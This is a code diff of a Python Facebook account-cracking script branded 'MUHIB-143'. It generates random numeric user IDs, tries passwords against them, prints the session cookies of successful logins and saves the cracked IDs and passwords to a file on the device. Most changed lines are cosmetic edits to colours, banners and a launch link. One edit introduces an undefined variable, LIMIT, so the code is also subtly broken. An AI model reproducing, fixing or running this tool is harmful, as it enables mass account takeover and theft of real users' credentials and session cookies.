@@ -90,7 +90,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://facebook.com/groups/554714119911648/')
+os.system('xdg-open https://www.facebook.com/its.muhib.7/')
 logo =("""\033[0;92m
   ███    ███[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██████ 
   [1;92m████  ████[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
@@ -98,13 +98,13 @@ logo =("""\033[0;92m
   [1;92m██  ██  ██[1;93m ██      ██[1;97m ██   ██[1;91m ██[1;92m ██   ██
   [1;92m██      ██[1;93m ██████████[1;97m ██   ██[1;91m ██[1;92m ██████
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
-[1;92m║   ~~~~~~~   FREE  UID CLONING     ~~~~~~~   ║
+[1;92m║    ~~~~~~~   FREE  UID CLONING     ~~~~~~~   ║
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝[1;92m
 [1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗[1;92m
 [1;92m║➣ [1;92mDEVOLPER   :          MUHIB-143 [1;92m          ║
 [1;92m║➣ [1;92mFACEBOOK   :          MUHIB-143 [1;92m          ║
 [1;92m║➣ [1;92mGITHUB     :          MUHIB-143[1;92m           ║
-[1;92m║➣ [1;92mTOOLS      :         UID CRACKING[1;92m         ║
+[1;92m║➣ [1;92mTOOLS      :          FACEBOOK CRACKING[1;92m   ║
 [1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
     """) 
 loop = 0
@@ -178,8 +178,8 @@ def xxr():
     code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
     print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
-    for nmbr in range(limit):
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[38;5;208m10000, \x1b[38;5;208m20000, \033[38;5;208m50000 ] \n\033[38;5;208m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mGIVE CRACKING LIMIT:\033[0;93m '))
+    for nmbr in range(LIMIT):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     os.system("clear")
@@ -194,11 +194,11 @@ def xxr():
         clear()
         tl = str(len(user))
         jalan('\033[1;97m====================================================')
-        jalan(f'[{xr}^{x}]\x1b[38;5;208m  IDS: {xr}'+tl)
-        jalan(f'{x}[{xr}^{x}]\033[0;92m  STARTED')
-        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m MOBILE')
-        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mAIR PLAN MODE FOR SPEED')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mID WILL COMING SOON')
+        jalan(f'[{xr}^{x}]\x1b[1;92m  IDS: {xr}'+tl)
+        jalan(f'{x}[{xr}^{x}]\033[1;92m  STARTED')
+        jalan(f'\033[0;97m[{xr}^{x}]\033[1;93m MOBILE')
+        jalan(f'\033[0;97m[{xr}^{x}] \x1b[1;92mAIR PLAN MODE FOR SPEED')
+        jalan(f'\033[0;97m[{xr}^{x}] \033[1;92mID WILL COMING SOON')
         jalan('\033[1;97m====================================================')
         for love in user:
             pwx = [love[1:]]
@@ -248,7 +248,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[MUHIB-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🧨]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[MUHIB-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🧨]\033[1;92m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/MUHIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
